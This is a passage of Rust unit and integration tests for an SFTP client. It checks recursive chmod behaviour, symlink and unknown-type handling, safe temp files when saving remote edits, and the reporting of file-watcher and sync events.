    /// exactly as they are.
    #[test]
    fn collision_guard_only_touches_downloads() {
        let mut up = dl("/d/a");
        up.kind = JobKind::Upload;
        let mut copy_a = dl("");
        copy_a.kind = JobKind::ServerCopy;
        let mut copy_b = dl("");
        copy_b.kind = JobKind::ServerCopy;
        let mut items = vec![up, dl("/d/a"), copy_a, copy_b];
        let notes = dedupe_local_targets(&mut items);
        assert!(notes.is_empty());
        assert_eq!(locals(&items), vec!["/d/a", "/d/a", "", ""]);
    }

    // ─── recursive chmod (A7-20) ─────────────────────────────────────────────

    /// A `chmod_walk` over a canned tree, recording every list/apply call in
    /// order; `refuse` makes `apply` fail for those paths.
    async fn run_chmod(
        tree: &Tree,
        refuse: &[&str],
        apply_files: bool,
        apply_dirs: bool,
    ) -> (ChmodOutcome, Vec<String>) {
        let log: RefCell<Vec<String>> = RefCell::new(Vec::new());
        let outcome = chmod_walk(
            "/t",
            |dir: String| {
                log.borrow_mut().push(format!("list {dir}"));
                std::future::ready(tree.get(&dir).cloned().unwrap_or_else(|| Ok(Vec::new())))
            },
            |path: String, _kind: EntryKind| {
                log.borrow_mut().push(format!("apply {path}"));
                std::future::ready(if refuse.contains(&path.as_str()) {
                    Err(format!("{path}: Permission denied"))
                } else {
                    Ok(())
                })
            },
            apply_files,
            apply_dirs,
        )
        .await;
        (outcome, log.into_inner())
    }

    fn chmod_tree_fixture() -> Tree {
        let mut tree = Tree::new();
        tree.insert(
            "/t".into(),
            Ok(vec![
                entry("f", EntryKind::File),
                entry("d", EntryKind::Dir),
                entry("storage", EntryKind::Symlink),
                entry("ln", EntryKind::Symlink),
            ]),
        );
        tree.insert("/t/d".into(), Ok(vec![entry("g", EntryKind::File)]));
        tree
    }

    /// A7-20: SETSTAT follows a symlink, so chmod'ing one changed its TARGET -
    /// a `storage -> ../shared/storage` link received a file mode and the
    /// shared directory lost its search bit. Links are skipped (as GNU
    /// `chmod -R` does) and counted.
    #[tokio::test]
    async fn chmod_walk_skips_symlinks() {
        let (outcome, log) = run_chmod(&chmod_tree_fixture(), &[], true, true).await;

        let mut applied: Vec<&str> = log
            .iter()
            .filter_map(|l| l.strip_prefix("apply "))
            .collect();
        applied.sort();
        assert_eq!(applied, vec!["/t/d", "/t/d/g", "/t/f"]);
        assert_eq!(outcome.changed, 3);
        assert_eq!(outcome.skipped_links, 2);
        assert_eq!(outcome.failed.total, 0);
    }

    /// The first refused entry used to stop the whole walk (`?`), leaving a
    /// half-applied tree and no account of it.
    #[tokio::test]
    async fn chmod_walk_keeps_going_after_a_refused_entry() {
        let (outcome, log) = run_chmod(&chmod_tree_fixture(), &["/t/f"], true, true).await;

        assert_eq!(outcome.changed, 2, "d and d/g still changed");
        assert_eq!(outcome.failed.total, 1);
        assert_eq!(outcome.failed.items, vec!["/t/f: Permission denied"]);
        assert!(log.contains(&"apply /t/d/g".to_string()));
    }

    /// A folder that cannot be listed is a recorded failure, not an abort.
    #[tokio::test]
    async fn chmod_walk_records_an_unlistable_folder_and_continues() {
        let mut tree = chmod_tree_fixture();
        tree.insert("/t/d".into(), Err("Permission denied (code 3)".to_string()));

        let (outcome, _) = run_chmod(&tree, &[], true, true).await;

        assert_eq!(outcome.changed, 2, "f and d (listing d failed)");
        assert_eq!(outcome.failed.total, 1);
        assert!(outcome.failed.items[0].contains("/t/d"));
    }

    #[tokio::test]
    async fn chmod_walk_honours_files_only_and_dirs_only() {
        let (files_only, log) = run_chmod(&chmod_tree_fixture(), &[], true, false).await;
        let applied: Vec<&str> = log
            .iter()
            .filter_map(|l| l.strip_prefix("apply "))
            .collect();
        assert!(!applied.contains(&"/t/d"), "directories untouched");
        assert!(applied.contains(&"/t/d/g"), "but still descended into");
        assert_eq!(files_only.changed, 2);

        let (dirs_only, log) = run_chmod(&chmod_tree_fixture(), &[], false, true).await;
        let applied: Vec<&str> = log
            .iter()
            .filter_map(|l| l.strip_prefix("apply "))
            .collect();
        assert_eq!(applied, vec!["/t/d"]);
        assert_eq!(dirs_only.changed, 1);
    }

    /// Parent before children, so a directory made searchable is searchable by
    /// the time the walk lists it.
    #[tokio::test]
    async fn chmod_walk_applies_to_a_folder_before_listing_it() {
        let (_, log) = run_chmod(&chmod_tree_fixture(), &[], true, true).await;
        let apply = log.iter().position(|l| l == "apply /t/d").unwrap();
        let list = log.iter().position(|l| l == "list /t/d").unwrap();
        assert!(apply < list, "{log:?}");
    }

    #[tokio::test]
    async fn chmod_walk_is_bounded_in_depth() {
        let mut tree = Tree::new();
        let mut path = "/t".to_string();
        for _ in 0..(CHMOD_MAX_DEPTH + 10) {
            tree.insert(path.clone(), Ok(vec![entry("n", EntryKind::Dir)]));
            path = format!("{path}/n");
        }
        let (outcome, log) = run_chmod(&tree, &[], true, true).await;
        assert_eq!(outcome.changed as usize, CHMOD_MAX_DEPTH);
        assert!(log.len() < 2 * CHMOD_MAX_DEPTH + 4);
        assert!(outcome.failed.total >= 1, "the cut-off is reported");
    }

    /// Against a real server: the symlinked directory outside the tree keeps
    /// its mode (the bug changed it), real entries change.
    #[cfg(unix)]
    #[tokio::test]
    async fn chmod_walk_leaves_a_symlink_target_outside_the_tree_alone() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/t/f", b"x");
        fx.mkdir("/t/d");
        fx.mkdir("/shared/storage");
        fx.symlink("../shared/storage", "/t/storage");
        let before = fx.mode("/shared/storage");
        let sftp_ref: &russh_sftp::client::SftpSession = &sftp;

        let outcome = chmod_walk(
            "/t",
            |dir| async move { list_remote_dir(sftp_ref, &dir).await },
            |p, _| async move { chmod_one(sftp_ref, &p, 0o600).await },
            true,
            true,
        )
        .await;

        assert_eq!(
            fx.mode("/shared/storage"),
            before,
            "link target was chmod'ed"
        );
        assert_eq!(fx.mode("/t/f"), 0o600);
        assert_eq!(fx.mode("/t/d"), 0o600);
        assert_eq!(outcome.skipped_links, 1);
        assert_eq!(outcome.failed.total, 0);
    }

    // ─── RU4: chmod on a server that does not report file types ─────────────

    #[cfg(unix)]
    fn set_mode(fx: &crate::sftp::testkit::Fixture, virt: &str, mode: u32) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(fx.path(virt), std::fs::Permissions::from_mode(mode)).unwrap();
    }

    /// `/t` (0755) holds `f` (0644), `d` (0755) with `d/g` (0644), and `ln`, a
    /// link to `/outside` (0755), on a server that leaves the type bits out.
    #[cfg(unix)]
    async fn untyped_tree() -> (
        russh_sftp::client::SftpSession,
        crate::sftp::testkit::Fixture,
    ) {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/t/f", b"x");
        fx.write("/t/d/g", b"y");
        fx.mkdir("/outside");
        fx.symlink("../outside", "/t/ln");
        for (virt, mode) in [
            ("/t", 0o755),
            ("/t/d", 0o755),
            ("/outside", 0o755),
            ("/t/f", 0o644),
            ("/t/d/g", 0o644),
        ] {
            set_mode(&fx, virt, mode);
        }
        fx.knobs.lock().unwrap().untyped_modes = true;
        (sftp, fx)
    }

    /// JU1 follow-up: the root's STAT has no type bits, so the old code saw
    /// "not a folder", changed `/t` alone with a FILE mode and reported
    /// `changed: 1`. The root and every entry are now told apart (LSTAT,
    /// READLINK, opening as a folder) and the files-only scope is honoured.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru4_recursive_chmod_walks_with_its_scope_when_types_are_missing() {
        let (sftp, fx) = untyped_tree().await;
        let out = chmod_path(&sftp, "/t", 0o600, true, true, false)
            .await
            .unwrap();
        assert_eq!(fx.mode("/t/f"), 0o600);
        assert_eq!(fx.mode("/t/d/g"), 0o600);
        assert_eq!(
            fx.mode("/t"),
            0o755,
            "files-only: the folder keeps its mode"
        );
        assert_eq!(
            fx.mode("/t/d"),
            0o755,
            "files-only: the folder keeps its mode"
        );
        assert_eq!(fx.mode("/outside"), 0o755, "a link is never followed");
        assert_eq!(out["changed"], 2, "{out}");
        assert_eq!(out["skippedLinks"], 1, "{out}");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn ru4_untyped_listing_entries_are_classified_not_assumed_files() {
        let (sftp, _fx) = untyped_tree().await;
        let mut got: Vec<(String, EntryKind)> = list_remote_dir(&sftp, "/t")
            .await
            .unwrap()
            .into_iter()
            .map(|e| (e.name, e.kind))
            .collect();
        got.sort_by(|a, b| a.0.cmp(&b.0));
        assert_eq!(
            got,
            vec![
                ("d".to_string(), EntryKind::Dir),
                ("f".to_string(), EntryKind::File),
                ("ln".to_string(), EntryKind::Symlink),
            ]
        );
    }

    /// When even opening it as a folder cannot settle what the root is, a
    /// recursive request is refused with the reason instead of quietly
    /// changing the root alone; a plain change still works.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru4_recursive_chmod_refuses_a_root_of_unknown_type() {
        let (sftp, fx) = untyped_tree().await;
        fx.knobs.lock().unwrap().unlistable.push("/t/d".to_string());
        let err = chmod_path(&sftp, "/t/d", 0o700, true, true, true)
            .await
            .unwrap_err();
        // The renderer shows "<path>: <message>" and labels the option
        // "Recurse into subdirectories" (review fix 9).
        assert!(!err.starts_with("/t/d"), "{err}");
        assert!(err.contains("Recurse into subdirectories"), "{err}");
        assert_eq!(fx.mode("/t/d"), 0o755, "nothing was changed");
        let out = chmod_path(&sftp, "/t/d", 0o700, false, true, true)
            .await
            .unwrap();
        assert_eq!(out["changed"], 1);
        assert_eq!(fx.mode("/t/d"), 0o700);
    }

    /// Review fix 1: a recursive change never puts setuid/setgid/sticky on a
    /// walked file or other non-folder - folders get the full mode, the rest
    /// `mode & 0o777` - whether or not the server reports types. (The
    /// renderer splits such a mode only when the root's STAT says "folder";
    /// a 2775 folder used to make every file below it setgid.)
    #[cfg(unix)]
    #[tokio::test]
    async fn ru4_recursive_chmod_never_spreads_special_bits_to_files() {
        for untyped in [true, false] {
            let (sftp, fx) = untyped_tree().await;
            fx.knobs.lock().unwrap().untyped_modes = untyped;
            let out = chmod_path(&sftp, "/t", 0o2775, true, true, true)
                .await
                .unwrap();
            for dir in ["/t", "/t/d"] {
                assert_eq!(fx.mode(dir), 0o2775, "{dir} untyped={untyped}");
            }
            for file in ["/t/f", "/t/d/g"] {
                assert_eq!(fx.mode(file), 0o775, "{file} untyped={untyped}");
            }
            assert_eq!(fx.mode("/outside"), 0o755, "the link target is untouched");
            assert_eq!(out["changed"], 4, "{out}");
            // A file the user picked keeps exactly the mode asked for.
            let out = chmod_path(&sftp, "/t/f", 0o4755, true, true, true)
                .await
                .unwrap();
            assert_eq!(fx.mode("/t/f"), 0o4755, "untyped={untyped}");
            assert_eq!(out["changed"], 1);
        }
    }

    /// Review fixes 2 and 3: what a READLINK or a folder probe answer means
    /// is never guessed. OpenSSH's sftp-server answers READLINK on a non-link
    /// with SSH_FX_BAD_MESSAGE (EINVAL) and OPENDIR on a file with
    /// SSH_FX_NO_SUCH_FILE (ENOTDIR); anything else unexplained is Unknown.
    #[test]
    fn ru4_probe_answers_are_never_guessed() {
        use russh_sftp::protocol::StatusCode as S;
        assert!(readlink_says_not_a_link(&status_err(S::BadMessage, "")));
        // RU6a fix round 1 (item 8): "failure" and "no such file" are not
        // conclusive - a server that answers every READLINK with "failure"
        // says it of a link too. Those go to the REALPATH check.
        for code in [
            S::Failure,
            S::NoSuchFile,
            S::OpUnsupported,
            S::PermissionDenied,
            S::ConnectionLost,
            S::NoConnection,
        ] {
            assert!(!readlink_says_not_a_link(&status_err(code, "")), "{code:?}");
        }
        assert_eq!(folder_probe_kind(Ok(())), EntryKind::Dir);
        for code in [S::NoSuchFile, S::Failure] {
            assert_eq!(
                folder_probe_kind(Err(status_err(code, ""))),
                EntryKind::File,
                "{code:?}"
            );
        }
        for code in [
            S::PermissionDenied,
            S::OpUnsupported,
            S::BadMessage,
            S::ConnectionLost,
            S::NoConnection,
            S::Eof,
        ] {
            assert_eq!(
                folder_probe_kind(Err(status_err(code, ""))),
                EntryKind::Unknown,
                "{code:?}"
            );
        }
        let timeout = russh_sftp::client::error::Error::Timeout;
        assert_eq!(folder_probe_kind(Err(timeout)), EntryKind::Unknown);
    }

    /// Review fix 3: an untyped entry whose LSTAT fails is left alone like
    /// any other entry of unknown type (it used to be `Other`, which a
    /// recursive chmod changes with the files' mode).
    #[cfg(unix)]
    #[tokio::test]
    async fn ru4_untyped_entry_whose_lstat_fails_is_left_alone() {
        let (sftp, fx) = untyped_tree().await;
        fx.knobs
            .lock()
            .unwrap()
            .lstat_refused
            .push("/t/d".to_string());
        let kinds: Vec<(String, EntryKind)> = list_remote_dir(&sftp, "/t")
            .await
            .unwrap()
            .into_iter()
            .map(|e| (e.name, e.kind))
            .collect();
        assert!(
            kinds.contains(&("d".to_string(), EntryKind::Unknown)),
            "{kinds:?}"
        );
        let out = chmod_path(&sftp, "/t", 0o700, true, true, true)
            .await
            .unwrap();
        assert_eq!(fx.mode("/t/d"), 0o755, "{out}");
        assert!(out["failed"].to_string().contains("/t/d"), "{out}");
    }

    /// An entry the walk cannot classify is left alone and reported, never
    /// given a file's mode on a guess.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru4_recursive_chmod_leaves_entries_of_unknown_type_alone() {
        let (sftp, fx) = untyped_tree().await;
        fx.knobs.lock().unwrap().unlistable.push("/t/d".to_string());
        let out = chmod_path(&sftp, "/t", 0o640, true, true, false)
            .await
            .unwrap();
        assert_eq!(fx.mode("/t/f"), 0o640);
        assert_eq!(fx.mode("/t/d"), 0o755, "unknown type: unchanged");
        assert_eq!(out["changed"], 1, "{out}");
        assert!(out["failed"].to_string().contains("/t/d"), "{out}");
    }

    // ─── RU6a fix 1, item 1 (F1): the edit's temporary remote file ──────────

    /// Names in the test server's `dir` that are edit temp files.
    #[cfg(unix)]
    fn temps_in(fx: &crate::sftp::testkit::Fixture, dir: &str) -> Vec<String> {
        std::fs::read_dir(fx.path(dir))
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|name| name.contains(EDIT_TMP_SUFFIX))
            .collect()
    }

    /// The edit temp file the last upload opened (from the server's log).
    #[cfg(unix)]
    fn opened_temp(fx: &crate::sftp::testkit::Fixture) -> String {
        fx.ops()
            .iter()
            .rev()
            .filter_map(|op| op.strip_prefix("open "))
            .filter_map(|rest| rest.split(' ').next())
            .find(|path| path.contains(EDIT_TMP_SUFFIX))
            .map(str::to_string)
            .expect("an edit temp file was opened")
    }

    /// What `path` is on the test server: "link", "file" or "missing".
    #[cfg(unix)]
    fn kind_of(fx: &crate::sftp::testkit::Fixture, path: &str) -> &'static str {
        match std::fs::symlink_metadata(fx.path(path)) {
            Ok(md) if md.file_type().is_symlink() => "link",
            Ok(_) => "file",
            Err(_) => "missing",
        }
    }

    /// Something already at the temp name - a link to another file, or
    /// someone's regular file in a shared folder. The save used to open it with
    /// CREATE|TRUNCATE (writing THROUGH the link into its target, or truncating
    /// the file), then delete the real file and rename the link into its place.
    /// Now it refuses cleanly and touches none of the three.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_an_edit_save_never_writes_through_a_planted_temp_file() {
        for planted_link in [true, false] {
            let (sftp, fx) = crate::sftp::testkit::serve().await;
            fx.write("/srv/report.txt", b"original");
            fx.write("/srv/victim", b"victim data");
            let tmp = "/srv/report.txt.sshspan-tmp-fixed";
            if planted_link {
                fx.symlink("victim", tmp);
            } else {
                fx.write(tmp, b"someone else's file");
            }
            let local = LocalDir::new();
            let staged = local.0.join("staged.txt");
            std::fs::write(&staged, b"my edit").unwrap();

            let err = upload_edited_file_as(&sftp, &staged, "/srv/report.txt", None, tmp)
                .await
                .expect_err("something is in the way");

            assert!(err.contains("in the way"), "link={planted_link}: {err}");
            assert_eq!(fx.read("/srv/report.txt"), b"original");
            assert_eq!(kind_of(&fx, "/srv/report.txt"), "file");
            assert_eq!(fx.read("/srv/victim"), b"victim data");
            if planted_link {
                assert_eq!(kind_of(&fx, tmp), "link");
            } else {
                assert_eq!(fx.read(tmp), b"someone else's file");
            }
        }
    }

    /// The temp file swapped for a link between our CLOSE and our RENAME (same
    /// size, so a size check alone does not notice): it is not renamed into the
    /// real file's place.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_an_edit_temp_swapped_for_a_link_is_not_renamed_into_place() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/report.txt", b"original");
        fx.write("/srv/victim", b"VICTIM!");
        let tmp = "/srv/report.txt.sshspan-tmp-fixed";
        fx.knobs.lock().unwrap().swap_for_link_on_close = Some((tmp.into(), "victim".into()));
        let local = LocalDir::new();
        let staged = local.0.join("staged.txt");
        std::fs::write(&staged, b"my edit").unwrap();

        let err = upload_edited_file_as(&sftp, &staged, "/srv/report.txt", None, tmp)
            .await
            .expect_err("the temp file is no longer ours");

        assert!(err.contains("not a regular file"), "{err}");
        assert_eq!(fx.read("/srv/report.txt"), b"original");
        assert_eq!(kind_of(&fx, "/srv/report.txt"), "file");
        assert_eq!(fx.read("/srv/victim"), b"VICTIM!");
    }

    /// Each save uses a fresh, unguessable temp name next to the target, so
    /// nothing can be planted for it in advance.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_edit_temp_names_are_fresh_and_unguessable() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v0");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        for content in [&b"v1"[..], b"v2, longer"] {
            std::fs::write(&staged, content).unwrap();
            upload_edited_file(&sftp, &staged, "/srv/app.conf", None)
                .await
                .unwrap();
        }
        let temps: Vec<String> = fx
            .ops()
            .iter()
            .filter_map(|op| op.strip_prefix("open "))
            .filter_map(|rest| rest.split(' ').next())
            .filter(|path| path.contains(EDIT_TMP_SUFFIX))
            .map(str::to_string)
            .collect();
        assert_eq!(temps.len(), 2, "{:?}", fx.ops());
        assert_ne!(temps[0], temps[1], "a predictable name can be planted");
        for t in &temps {
            let random = t
                .strip_prefix("/srv/app.conf.sshspan-tmp-")
                .unwrap_or_else(|| panic!("{t}"));
            assert!(
                random.len() >= 16 && random.chars().all(|c| c.is_ascii_hexdigit()),
                "{t}"
            );
        }
        assert_eq!(fx.read("/srv/app.conf"), b"v2, longer");
    }

    // ─── RU6a item 6: the remote temp file of a failed edit upload ───────────

    /// A server on Windows (Win32-OpenSSH) will not delete a file that is
    /// still open. A failed upload deleted its temp file while our handle
    /// was still open, so the cleanup failed there and the temp file stayed.
    /// The handle is closed first.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_failed_edit_upload_closes_its_temp_file_before_deleting_it() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"precious original");
        {
            let mut knobs = fx.knobs.lock().unwrap();
            knobs.write_fail_at = Some(0);
            knobs.refuse_remove_open = true;
        }
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, vec![b'x'; 100_000]).unwrap();

        let err = upload_edited_file(&sftp, &staged, "/srv/app.conf", None)
            .await
            .expect_err("the write is refused");

        let tmp = opened_temp(&fx);
        assert!(
            temps_in(&fx, "/srv").is_empty(),
            "temp file left behind: {err} {:?}",
            fx.ops()
        );
        assert!(!err.contains("left at"), "{err}");
        let ops = fx.ops();
        let closed = ops.iter().position(|op| op == &format!("close {tmp}"));
        let removed = ops.iter().rposition(|op| op == &format!("remove {tmp}"));
        assert!(
            matches!((closed, removed), (Some(c), Some(r)) if c < r),
            "close must come before the delete: {ops:?}"
        );
        assert_eq!(fx.read("/srv/app.conf"), b"precious original");
    }

    /// One retry for a temp file another process briefly holds; a lasting
    /// refusal still names the leftover (see the test above it).
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_deleting_the_temp_file_of_a_failed_edit_upload_is_retried_once() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"precious original");
        {
            let mut knobs = fx.knobs.lock().unwrap();
            knobs.write_fail_at = Some(0);
            knobs.remove_refusals_left = 1;
        }
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, vec![b'x'; 100_000]).unwrap();

        let err = upload_edited_file(&sftp, &staged, "/srv/app.conf", None)
            .await
            .expect_err("the write is refused");

        assert!(temps_in(&fx, "/srv").is_empty(), "{err}");
        assert!(!err.contains("left at"), "{err}");
        let removes = fx
            .ops()
            .iter()
            .filter(|op| op.starts_with("remove "))
            .count();
        assert_eq!(removes, 2, "{:?}", fx.ops());
    }

    // ─── edit and sync back (A7-19) ──────────────────────────────────────────

    fn watch_event(kind: notify::EventKind, paths: &[&str]) -> notify::Event {
        let mut event = notify::Event::new(kind);
        for p in paths {
            event = event.add_path(PathBuf::from(p));
        }
        event
    }

    /// Which directory events count as "the staged file was saved". The watch
    /// is on the DIRECTORY so atomic-save editors (write a temp, rename it over
    /// the original) are seen; renaming the file AWAY, deleting it and
    /// metadata/access noise are not saves.
    #[test]
    fn edit_triggers_cover_atomic_saves_and_ignore_noise() {
        use notify::event::{
            AccessKind, AccessMode, CreateKind, DataChange, MetadataKind, ModifyKind, RemoveKind,
            RenameMode,
        };
        use notify::EventKind::{Access, Create, Modify, Remove};
        let staged = std::ffi::OsStr::new("abc12345-notes.uuid.txt");
        let file = "/tmp/sshspan-edit/abc12345-notes.uuid.txt";
        let other = "/tmp/sshspan-edit/someone-else.txt";
        let tmp = "/tmp/sshspan-edit/.abc12345.tmp";

        // Saves: in-place writes...
        for kind in [
            Modify(ModifyKind::Data(DataChange::Content)),
            Modify(ModifyKind::Data(DataChange::Any)),
            Modify(ModifyKind::Any),
            // ...and the atomic-replace family: the file (re)created, or
            // renamed INTO place.
            Create(CreateKind::File),
            Modify(ModifyKind::Name(RenameMode::To)),
            Modify(ModifyKind::Name(RenameMode::Any)),
        ] {
            assert!(
                is_edit_trigger(&watch_event(kind, &[file]), staged),
                "{kind:?} on the staged file is a save"
            );
        }
        // `[from, to]`: renaming a temp over the staged file.
        assert!(is_edit_trigger(
            &watch_event(Modify(ModifyKind::Name(RenameMode::Both)), &[tmp, file]),
            staged
        ));

        // Not saves.
        for kind in [
            Modify(ModifyKind::Metadata(MetadataKind::Any)),
            Modify(ModifyKind::Name(RenameMode::From)),
            Remove(RemoveKind::File),
            Access(AccessKind::Close(AccessMode::Write)),
            notify::EventKind::Any,
        ] {
            assert!(
                !is_edit_trigger(&watch_event(kind, &[file]), staged),
                "{kind:?} on the staged file is not a save"
            );
        }
        // The staged file renamed away to a backup (`[from, to]` the other way).
        assert!(!is_edit_trigger(
            &watch_event(
                Modify(ModifyKind::Name(RenameMode::Both)),
                &[file, "/tmp/sshspan-edit/backup~"]
            ),
            staged
        ));
        // Other files in the shared staging directory never trigger this watch.
        assert!(!is_edit_trigger(
            &watch_event(Create(CreateKind::File), &[other]),
            staged
        ));
        assert!(!is_edit_trigger(
            &watch_event(Create(CreateKind::File), &[]),
            staged
        ));
    }

    /// The finding's "suspected" half, run against the real file watcher
    /// (inotify): a watch on the FILE misses an atomic save - the rename
    /// replaces the inode it watches - while a watch on the DIRECTORY sees it.
    #[cfg(target_os = "linux")]
    #[test]
    fn a_directory_watch_sees_an_atomic_save_that_a_file_watch_misses() {
        use notify::Watcher;
        use std::sync::mpsc;
        use std::time::Duration;

        let dir = std::env::temp_dir().join(format!("sshspan-watch-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let staged = dir.join("staged.txt");
        std::fs::write(&staged, b"v0").unwrap();
        let name = staged.file_name().unwrap().to_os_string();

        let (file_tx, file_rx) = mpsc::channel();
        let mut file_watch =
            notify::recommended_watcher(move |ev: notify::Result<notify::Event>| {
                let _ = file_tx.send(ev);
            })
            .unwrap();
        file_watch
            .watch(&staged, notify::RecursiveMode::NonRecursive)
            .unwrap();
        let (dir_tx, dir_rx) = mpsc::channel();
        let mut dir_watch =
            notify::recommended_watcher(move |ev: notify::Result<notify::Event>| {
                let _ = dir_tx.send(ev);
            })
            .unwrap();
        dir_watch
            .watch(&dir, notify::RecursiveMode::NonRecursive)
            .unwrap();

        // An atomic save: write a temp file, rename it over the original...
        std::fs::write(dir.join(".staged.tmp"), b"v1").unwrap();
        std::fs::rename(dir.join(".staged.tmp"), &staged).unwrap();
        // ...and the editor's NEXT save (an in-place write to the new file).
        std::thread::sleep(Duration::from_millis(100));
        std::fs::write(&staged, b"v2 - saved again").unwrap();

        // The directory watch must report a save; wait for it rather than for a
        // fixed time (the positive half is the one a slow machine could fail).
        let mut dir_events: Vec<notify::Event> = Vec::new();
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        while std::time::Instant::now() < deadline
            && !dir_events.iter().any(|e| is_edit_trigger(e, &name))
        {
            if let Ok(Ok(ev)) = dir_rx.recv_timeout(Duration::from_millis(100)) {
                dir_events.push(ev);
            }
        }
        assert!(
            dir_events.iter().any(|e| is_edit_trigger(e, &name)),
            "the directory watch must see the save: {dir_events:?}"
        );
        // The file watch followed the replaced inode: it never saw the new
        // content being written. (Absence can only be violated by an event
        // arriving, so a short settle time cannot make this flaky.)
        std::thread::sleep(Duration::from_millis(300));
        let file_events: Vec<notify::Event> = file_rx.try_iter().flatten().collect();
        assert!(
            !file_events.iter().any(|e| matches!(
                e.kind,
                notify::EventKind::Modify(notify::event::ModifyKind::Data(_))
            )),
            "a watch on the file should have missed the second save: {file_events:?}"
        );
        drop((file_watch, dir_watch));
        std::fs::remove_dir_all(&dir).ok();
    }

    /// A notify error used to be dropped on the floor (`let Ok(event) = res
    /// else { return }`): a watcher that died looked exactly like "no saves".
    /// (A queue overflow is NOT such an error in notify 7 - see
    /// `ru6a_a_watcher_overflow_is_a_rescan_not_an_error`.)
    #[test]
    fn watcher_errors_are_surfaced_not_swallowed() {
        use notify::event::{CreateKind, EventKind};
        let staged = std::ffi::OsStr::new("a.txt");

        let err = watch_verdict(
            Err(notify::Error::generic("the watched folder was removed")),
            staged,
        )
        .expect_err("a watcher error must reach the caller");
        assert!(err.contains("the watched folder was removed"), "{err}");

        let save = watch_event(EventKind::Create(CreateKind::File), &["/d/a.txt"]);
        assert_eq!(watch_verdict(Ok(save), staged), Ok(WatchVerdict::Save));
        let other = watch_event(EventKind::Create(CreateKind::File), &["/d/b.txt"]);
        assert_eq!(
            watch_verdict(Ok(other), staged),
            Ok(WatchVerdict::Unrelated)
        );
    }

    /// RU6a item 12: the event names its edit session, and a conflict says
    /// what the server holds now.
    #[test]
    fn edit_sync_events_report_success_failure_conflict_and_reload() {
        let event = |outcome| edit_sync_event("sess", "edit-1", "/etc/app.conf", &outcome);
        let base = |fields: serde_json::Value| {
            let mut v = serde_json::json!({
                "sessionId": "sess", "editId": "edit-1", "remote": "/etc/app.conf",
            });
            v.as_object_mut()
                .unwrap()
                .extend(fields.as_object().unwrap().clone());
            v
        };
        assert_eq!(
            event(SyncOutcome::Uploaded),
            base(serde_json::json!({ "ok": true }))
        );
        assert_eq!(
            event(SyncOutcome::Failed("upload failed: boom".into())),
            base(serde_json::json!({ "ok": false, "error": "upload failed: boom" }))
        );
        let conflict = |reason, remote| SyncOutcome::Conflict {
            name: "app.conf".into(),
            conflict: PendingConflict {
                id: "c-1".into(),
                local: String::new(),
                reason,
                remote,
                remote_sha256: None,
            },
        };
        let stamp = RemoteStamp {
            size: Some(12),
            mtime: Some(1_700_000_000),
        };
        assert_eq!(
            event(conflict(ConflictReason::Changed, stamp)),
            base(serde_json::json!({
                "ok": false,
                "conflict": true,
                "conflictId": "c-1",
                "reason": "changed",
                "error": "app.conf changed on the server since you opened it - choose Overwrite or Reload.",
                "remoteSize": 12,
                "remoteModifiedMs": 1_700_000_000_000i64,
            }))
        );
        assert_eq!(
            event(conflict(ConflictReason::Deleted, RemoteStamp::default())),
            base(serde_json::json!({
                "ok": false,
                "conflict": true,
                "conflictId": "c-1",
                "reason": "deleted",
                "error": "app.conf was deleted on the server since you opened it - choose Overwrite to put your copy back, or close it.",
                "remoteSize": null,
                "remoteModifiedMs": null,
            }))
        );
        let unverifiable = event(conflict(
            ConflictReason::Unverifiable,
            RemoteStamp::default(),
        ));
        assert_eq!(unverifiable["reason"], "unverifiable");
        assert!(
            unverifiable["error"]
                .as_str()
                .is_some_and(|e| e.contains("cannot tell whether app.conf changed")),
            "{unverifiable}"
        );
        assert_eq!(
            event(SyncOutcome::Reloaded),
            base(serde_json::json!({ "ok": true, "reloaded": true }))
        );
    }

    /// One save fires a burst of events. Only the LAST one of a burst may
    /// upload (the rest are told they were superseded) - the old code started
    /// an upload per event, so one save raced two or three of them.
    #[tokio::test]
    async fn debounce_lets_only_the_last_event_of_a_burst_upload() {
        let debounce = Arc::new(EditDebounce::new(std::time::Duration::from_millis(500)));
        let mut tasks = Vec::new();
        for _ in 0..3 {
            let d = debounce.clone();
            tasks.push(tokio::spawn(async move { d.settle().await }));
            tokio::time::sleep(std::time::Duration::from_millis(20)).await;
        }
        let mut winners = Vec::new();
        for t in tasks {
            winners.push(t.await.unwrap());
        }
        assert_eq!(
            winners.iter().filter(|w| w.is_some()).count(),
            1,
            "{winners:?}"
        );
        assert!(
            winners[2].is_some(),
            "the newest event is the one that uploads"
        );
        // A later, separate save settles on its own.
        assert!(debounce.settle().await.is_some());
    }

    /// An `EditSync` over `sftp` writing `target`, events collected in the
    /// list - set up the way `sftp_open_for_edit` leaves one: the baseline is
    /// the remote file as it is now, and the server is taken to hold what
    /// `synced_content` hashes to (`None`: unknown).
    #[cfg(unix)]
    async fn edit_sync_with(
        sftp: russh_sftp::client::SftpSession,
        local: &std::path::Path,
        target: &str,
        mode: Option<u32>,
        synced_content: Option<&[u8]>,
    ) -> (Arc<EditSync>, Arc<std::sync::Mutex<Vec<serde_json::Value>>>) {
        use sha2::{Digest, Sha256};
        let events = Arc::new(std::sync::Mutex::new(Vec::new()));
